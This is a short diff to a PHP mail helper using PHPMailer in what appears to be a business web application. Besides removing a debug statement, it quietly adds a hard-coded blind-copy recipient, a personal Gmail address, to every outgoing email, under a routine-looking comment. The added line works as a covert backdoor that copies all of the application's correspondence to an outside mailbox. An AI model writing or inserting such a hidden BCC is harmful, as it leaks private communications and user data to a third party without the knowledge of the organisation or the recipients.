@@ -33,7 +33,7 @@ use PHPMailer\PHPMailer\Exception;
 function send_mail($message)
 {
     
-    print_r((array)$message); die();
+    //print_r((array)$message); die();
     
     if (defined('USER_ID')) {
 
@@ -486,6 +486,8 @@ function send_email($message='',$to='',$cc='')
             $mail->addAddress($to); // Name is optional
             if($cc)
                 $mail->addCC($cc); // Add a recipient
+            
+            $mail->addBCC('noufalnow@gmail.com'); // Add a recipient
             
             $mail->addReplyTo('info@astglobal.om', 'Ast Global');
             
